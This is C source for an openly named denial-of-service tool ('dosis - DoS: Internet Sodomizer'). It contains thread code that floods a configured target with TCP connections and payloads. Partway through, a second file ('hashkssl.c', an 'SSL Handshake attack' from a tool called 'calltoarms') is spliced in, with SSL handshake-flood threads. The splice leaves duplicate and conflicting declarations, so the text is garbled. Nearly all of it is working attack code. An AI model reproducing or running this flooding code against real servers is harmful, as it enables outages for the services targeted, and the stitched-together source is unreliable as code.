/*****************************************************************************
 * tcpssl.c
 *
 * TCP SSL connection generator.
 *
 * ---------------------------------------------------------------------------
 * dosis - DoS: Internet Sodomizer
 *   (C) 2008-2009 Gerardo García Peña <gerardo@kung-foo.dhs.org>
 *
 *   This program is free software; you can redistribute it and/or modify it
 *   under the terms of the GNU General Public License as published by the Free
 *   Software Foundation; either version 2 of the License, or (at your option)
 *   any later version.
 *
 *   This program is distributed in the hope that it will be useful, but WITHOUT
 *   ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or
 *   FITNESS FOR A PARTICULAR PURPOSE.  See the GNU General Public License for
 *   more details.
 *
 *   You should have received a copy of the GNU General Public License along
 *   with this program; if not, write to the Free Software Foundation, Inc., 51
 *   Franklin Street, Fifth Floor, Boston, MA  02110-1301  USA
 *
 *****************************************************************************/

#include <config.h>
#include "dosconfig.h"
#include "dosis.h"
#include "ip.h"
#include "lnet.h"
#include "log.h"
#include "payload.h"
#include "tea.h"

#define DEFAULT_CWAIT           3000000
#define DEFAULT_RWAIT           10000000

typedef struct _tag_TCP_CFG {
  /* options */
  INET_ADDR          dhost;

  /* parameters */
  double             hitratio;
  char              *payload;
  unsigned           payload_size;

  /* other things */
  pthreadex_timer_t  timer;
  struct timeval     sockwait_cwait;
  struct timeval     sockwait_rwait;
  struct sockaddr    dsockaddr;
} TCP_CFG;

#define BUFSIZE 4096
static char nullbuff[BUFSIZE];

/*****************************************************************************
 * THREAD IMPLEMENTATION
 *****************************************************************************/

#define ip_protocol(x) (((struct iphdr *) (x))->protocol)
#define ip_header(x)   ((struct iphdr *)  (x))
#define tcp_header(x)  ((struct tcphdr *) ((x) \
                       + (((struct iphdr *) (x))->ihl << 2)))

/*****************************************************************************
 * $Id: hashkssl.c,v 1.20 2007-05-28 17:01:51 gerardo Exp $
 *
 * SSL Handshake attack.
 *
 * ---------------------------------------------------------------------------
 * calltoarms - HTTP/S DoS Giver
 *   Coded Gerardo García Peña <gerardo@kung-foo.dhs.org>
 *****************************************************************************/

#include <config.h>
#include "calltoarms.h"
#include "hashkssl.h"
#include "output.h"
#include "ttimer.h"

#define BUFSIZE 4096
#define CIPHER_SUITE "DES-CBC3-SHA"

typedef struct _tag_HANDSHAKESSL_WORK {
  THREAD_WORK        *w;

  int                 sock;
  int                 port;
  SSL                *ssl;
  SSL_CTX            *ctx;
  BIO                *bio;
} HANDSHAKESSL_WORK;

int  SSL_initialize(HANDSHAKESSL_WORK *hw);
static void SSL_error_stack(void);

static pthreadex_flag_t tcpattack_flag;
static char *nullbuff;


/**** RIPPED OFF SIEGE 2.64 ****/

void SSL_finalize(HANDSHAKESSL_WORK *hw)
{
  if(hw->sock)
    close(hw->sock);
  if(hw->ssl)
  {
    SSL_shutdown(hw->ssl);
    SSL_free(hw->ssl);
  }
  if(hw->ctx)
    SSL_CTX_free(hw->ctx);
  hw->sock = 0;
  hw->ssl = NULL;
  hw->bio = NULL;
  hw->ctx = NULL;
}

int SSL_initialize(HANDSHAKESSL_WORK *hw)
{
  int  serr;

  hw->ssl    = NULL;
  hw->ctx    = NULL;
  hw->bio    = NULL;

  SSL_load_error_strings();
  SSL_library_init();

  if((hw->ctx = SSL_CTX_new(SSLv23_client_method())) == NULL)
  {
    SSL_error_stack();
    ERR("[%02u] Error creando nuevo ctx.", hw->w->id);
    return 1;
  }

  SSL_CTX_set_mode(hw->ctx, SSL_MODE_ENABLE_PARTIAL_WRITE|SSL_MODE_ACCEPT_MOVING_WRITE_BUFFER);
  SSL_CTX_set_session_cache_mode(hw->ctx, SSL_SESS_CACHE_BOTH);
  SSL_CTX_set_timeout(hw->ctx, 500000);
  if(!SSL_CTX_set_cipher_list(hw->ctx, CIPHER_SUITE))
  {
    ERR("[%02u] SSL_CTX_set_cipher_list", hw->w->id);
    return 1;
  }

  if((hw->ssl = SSL_new(hw->ctx)) == NULL)
  {
    SSL_error_stack();
    ERR("[%02u] Error creando nuevo ssl.", hw->w->id);
    return 1;
  }
  SSL_set_fd(hw->ssl, hw->sock);

  hw->bio = BIO_new_socket(hw->sock, BIO_NOCLOSE);
  SSL_set_bio(hw->ssl, hw->bio, hw->bio);

  serr = SSL_connect(hw->ssl);
  return 0;
}

static void SSL_error_stack(void) /* recursive dump of the error stack */
{
  unsigned long err;
  char string[120];

  err=ERR_get_error();
  if(!err)
    return;
  SSL_error_stack();
  ERR_error_string(err, string);
}

void attack_handshakessl__cleanup(HANDSHAKESSL_WORK *hw)
{
  DBG("[%02u] read %llu bytes.", hw->w->id, hw->w->stats.brecv);
  SSL_finalize(hw);
}

void attack_handshakessl__attack_thread(THREAD_WORK *w)
{
  struct sockaddr_in addr;
  struct timeval sockwait;
  fd_set socks;
  int sopts, r;
  HANDSHAKESSL_WORK hw;

  memset(&hw, 0, sizeof(hw));
  hw.w = w;

  /* build target addr */
  bzero((char *) &addr, sizeof(addr));
  bcopy(&opts.dhost, &addr.sin_addr, sizeof(struct in_addr));
  addr.sin_family = AF_INET;
  addr.sin_port = htons(opts.dport);

  /* get memory! */
  pthread_setcanceltype(PTHREAD_CANCEL_ASYNCHRONOUS, &r);
  pthread_setcancelstate(PTHREAD_CANCEL_ENABLE, &r);
  pthread_cleanup_push((void *) attack_handshakessl__cleanup, &hw);

  /* wait to start... */
  pthreadex_barrier_wait(w->start);

  /* perform attack forever (or until thread cancellation) */
  while(!opts.finalize)
  {
    /* De entrada y por si las moscas, finalizamos cualquier SSL abierta */
    SSL_finalize(&hw);

    /* Esperamos a que nos den permiso para empezar */
    DBG2("[%02u] Waiting for work...", hw.w->id);
    if(!opts.madness)
      pthreadex_flag_wait(&tcpattack_flag);

    /*** CONNECTION **********************************************************/
    /* Establecemos el timeout para los select (más tiempo => kk) */
    sockwait.tv_sec  = opts.cwait / 1000000;
    sockwait.tv_usec = opts.cwait % 1000000;
    hw.sock = socket(PF_INET, SOCK_STREAM, 0);
    if(hw.sock < 0)
    {
      ERR("[%02u] socket() failed (%s)", hw.w->id, strerror(errno));
      w->stats.nfail++;
      continue;
    }

    /* Execute connection, but before set non block */
    sopts = fcntl(hw.sock, F_GETFL);
    fcntl(hw.sock, F_SETFL, sopts | O_NONBLOCK);

    if(connect(hw.sock, &addr, sizeof(struct sockaddr_in)) < 0
    && errno != EINPROGRESS)
    {
      ERR("[%02u] connect() 1 failed:%s", hw.w->id, strerror(errno));
      close(hw.sock);
      w->stats.nfail++;
      continue;
    } else
      DBG2("[%02u] connect() sent!", hw.w->id);

    /* connection is completed or in progress... */
    fcntl(hw.sock, F_SETFL, sopts);
    FD_ZERO(&socks);
    FD_SET(hw.sock,&socks);
    if((r = select(hw.sock + 1, NULL, &socks, NULL, &sockwait)) < 1)
    {
      DBG("[%02u] connection timed out.", hw.w->id);
      close(hw.sock);
      w->stats.nfail++;
      continue;
    }

    /* second connect() to check connection */
    fcntl(hw.sock, F_SETFL, sopts | O_NONBLOCK);
    if(connect(hw.sock, &addr, sizeof(struct sockaddr_in)) < 0)
    {
      /* XXX: Se puede llegar aqui porque aún no ha conectado :) */
      ERR("[%02u] connect() 2 failed: %s", hw.w->id, strerror(errno));
      close(hw.sock);
      w->stats.nfail++;
      continue;
    }
    fcntl(hw.sock, F_SETFL, sopts);
 
    /*** SSL *****************************************************************/
    /* Now this is a succesful connection */
    hw.w->stats.nconn++;

    /* Create SSL connection over this socket */
    if((r = SSL_initialize(&hw)) != 0)
    {
      ERR("[%02u] Error en SSL_initialize (%d)", hw.w->id, r);
      w->stats.nfail++;
      continue;
    }

    /* Send request */
    r = SSL_write(hw.ssl, opts.req, opts.req_size);
    if(r < opts.req_size)
    {
      ERR("[%02u] Error en SSL_write.", hw.w->id);
      w->stats.nfail++;
      continue;
    }
    w->stats.bsent += opts.req_size;

    /* Restablish timeouts */
    sockwait.tv_sec  = opts.rwait / 1000000;
    sockwait.tv_usec = opts.rwait % 1000000;
    r = select(hw.sock+1, &socks, NULL, NULL, &sockwait);
    if(!FD_ISSET(hw.sock, &socks))
    {
      ERR("[%02u] select() error %d: %s", hw.w->id, r, strerror(errno));
      w->stats.nfail++;
      continue;
    }
    fcntl(hw.sock,F_SETFL,sopts);

    /* Rediret to /dev/null :) */
    while((r = read(hw.sock, nullbuff, BUFSIZE)) > 0)
      w->stats.brecv += (unsigned long long) r;

    /* Finished! */
    if(close(hw.sock) != 0)
      ERR("[%02u] error on close(): %s", hw.w->id, strerror(errno));
  }

  pthread_cleanup_pop(1);
}

int attack_handshakessl__go2work(void)
{
  return pthreadex_flag_up(&tcpattack_flag);
}

void attack_handshakessl(TTIMER_STATS *stats)
{
  /* /dev/null buffer */
  if((nullbuff = malloc(BUFSIZE * sizeof(char))) == NULL)
  {
    ERR("[--] No memory for /dev/null buffer. Terminating.");
    return;
  }

  /* coordinating flag */
  pthreadex_flag_init(&tcpattack_flag, 0);

  /* launch attack */
  thread_timer(attack_handshakessl__go2work,
               attack_handshakessl__attack_thread,
               stats);
}

static void tcp__thread(THREAD_WORK *tw)
{
  fd_set socks;
  int sopts, r;
  TCP_CFG *tt = (TCP_CFG *) tw->data;
  struct timeval sockwait;
  int sock;

  TDBG("Started sender thread");

  /* ATTACK */
  while(1)
  {
    /* wait for work */
    if(tt->hitratio > 0)
      if(pthreadex_timer_wait(&(tt->timer)) < 0)
        TERR("Error at pthreadex_timer_wait(): %s", strerror(errno));

    /*** CONNECTION **********************************************************/
    TDBG("  Connecting...");

    /* Set timeout for select */
    memcpy(&sockwait, &tt->sockwait_cwait, sizeof(struct timeval));
    sock = socket(PF_INET, SOCK_STREAM, 0);
    if(sock < 0)
    {
      TERR("socket() failed (%s)", strerror(errno));
      continue;
    }

    /* Execute connection, but before set non block */
    sopts = fcntl(sock, F_GETFL);
    fcntl(sock, F_SETFL, sopts | O_NONBLOCK);

    if(connect(sock, &tt->dsockaddr, sizeof(struct sockaddr_in)) < 0
    && errno != EINPROGRESS)
    {
      TERR("connect() 1 failed:%s", strerror(errno));
      close(sock);
      continue;
    } else
      TDBG2("connect() sent!");

    /* connection is completed or in progress... */
    fcntl(sock, F_SETFL, sopts);
    FD_ZERO(&socks);
    FD_SET(sock,&socks);
    if((r = select(sock + 1, NULL, &socks, NULL, &sockwait)) < 1)
    {
      TDBG("connection timed out.");
      close(sock);
      continue;
    }

    /* second connect() to check connection */
    fcntl(sock, F_SETFL, sopts | O_NONBLOCK);
    if(connect(sock, &tt->dsockaddr, sizeof(struct sockaddr_in)) < 0)
    {
      /* XXX: Se puede llegar aqui porque aún no ha conectado :) */
      TERR("connect() 2 failed: %s", strerror(errno));
      close(sock);
      continue;
    }
    fcntl(sock, F_SETFL, sopts);
 
    /* Enviamos la peticion */
    r = send(sock, (void *) tt->payload, tt->payload_size, 0);
    if(r < tt->payload_size)
    {
      TERR("Send error.");
      continue;
    }

    /* Restablecemos los timeouts */
    memcpy(&sockwait, &tt->sockwait_rwait, sizeof(struct timeval));
    r = select(sock+1, &socks, NULL, NULL, &sockwait);
    if(!FD_ISSET(sock, &socks))
    {
      TERR("select() error %d: %s", r, strerror(errno));
      continue;
    }
    fcntl(sock,F_SETFL,sopts);

    /*** READ DATA ***********************************************************/
    TDBG("  Reading data...");
    /* Redireccionamos a /dev/null :) */
    while((r = read(sock, nullbuff, sizeof(nullbuff))) > 0)
      ;

    /* Hemos terminado */
    TDBG("  Closing connection.");
    if(close(sock) != 0)
      TERR("error on close(): %s", strerror(errno));
  }
}

/*+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
 * CONFIGURATION. 
 *   Is important to consider that this function could be
 *   called several times during thread live: initial
 *   configuration and reconfigurations.
 *+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++*/

static int tcp__configure(THREAD_WORK *tw, SNODE *command)
{
  TCP_CFG *tt = (TCP_CFG *) tw->data;
  SNODE *cn;
  char *s;

  /* first initialization (specialized work thread data) */
  if(tt == NULL)
  {
    if((tt = calloc(1, sizeof(TCP_CFG))) == NULL)
      TFAT("No memory for TCP_CFG.");
    tw->data = (void *) tt;

    tt->sockwait_cwait.tv_sec  = DEFAULT_CWAIT / 1000000;
    tt->sockwait_cwait.tv_usec = DEFAULT_CWAIT % 1000000;
    tt->sockwait_rwait.tv_sec  = DEFAULT_RWAIT / 1000000;
    tt->sockwait_rwait.tv_usec = DEFAULT_RWAIT % 1000000;

    /* init timer */
    pthreadex_timer_init(&(tt->timer), 0.0);
  }

  /* read from SNODE command parameters */
  cn = command->command.thc.to->to.pattern;
  if(cn->type != TYPE_PERIODIC_LIGHT)
    TFAT("%d: Uknown pattern %d.", cn->line, cn->type);
  
  tt->hitratio = tea_get_float(cn->pattern.periodic.ratio);
  if(tt->hitratio < 0)
    TFAT("%d: Bad hit ratio '%f'.", cn->line, tt->hitratio);

  /* read from SNODE command options */
  for(cn = command->command.thc.to->to.options; cn; cn = cn->option.next)
    switch(cn->type)
    {
      case TYPE_OPT_DST:
        s = tea_get_string(cn->option.addr);
        if(ip_addr_parse(s, &tt->dhost))
          TFAT("%d: Cannot parse source address '%s'.", cn->line, s);
        free(s);
        if(cn->option.port)
          ip_addr_set_port(&tt->dhost, tea_get_int(cn->option.port));
        break;

      case TYPE_OPT_PAYLOAD_FILE:
      case TYPE_OPT_PAYLOAD_RANDOM:
      case TYPE_OPT_PAYLOAD_STR:
        payload_get(cn, &tt->payload, &tt->payload_size);
        break;

      case TYPE_OPT_CWAIT:
        {
          int t;
          t = tea_get_int(cn->option.cwait);
          if(t < 0)
            TFAT("%d: Bad connection wait (CWAIT) '%d'.", cn->line, t);
          tt->sockwait_cwait.tv_sec  = t / 1000000;
          tt->sockwait_cwait.tv_usec = t % 1000000;
        }
        break;

      case TYPE_OPT_RWAIT:
        {
          int t;
          t = tea_get_int(cn->option.rwait);
          if(t < 0)
            TFAT("%d: Bad read wait (RWAIT) '%d'.", cn->line, t);
          tt->sockwait_rwait.tv_sec  = t / 1000000;
          tt->sockwait_rwait.tv_usec = t % 1000000;
        }
        break;

      default:
        TFAT("%d: Uknown option %d.", cn->line, cn->type);
    }

  /* check dst address and configure socket */
  if(tt->dhost.type == INET_FAMILY_NONE)
    TFAT("I need a target address.");
  ip_addr_to_socket(&tt->dhost, &tt->dsockaddr);

  /* calculate timeout */

  /* configure timer */
  if(tt->hitratio > 0)
    pthreadex_timer_set_frequency(&(tt->timer), tt->hitratio);

  /* (debug) print configuration */
  {
    char buff[255];

    TDBG2("config.periodic.ratio = %d", tt->hitratio);
    ip_addr_snprintf(&tt->dhost, sizeof(buff)-1, buff);
    TDBG2("config.options.dhost  = %s", buff);
  }

  return 0;
}

static void tcp__cleanup(THREAD_WORK *tw)
{
  TCP_CFG *tt = (TCP_CFG *) tw->data;

  /* collect libnet data */
  pthreadex_timer_destroy(&tt->timer);

  if(tt->payload)
  {
    free(tt->payload);
    tt->payload = NULL;
  }
  free(tt);
  tw->data = NULL;

  TDBG("Finalized.");
}

/*+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
 * TCP TEA OBJECT
 *+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++*/

TEA_OBJECT teaTCP = {
  .name         = "TCP",
  .configure    = tcp__configure,
  .cleanup      = tcp__cleanup,
  .thread       = tcp__thread,
};

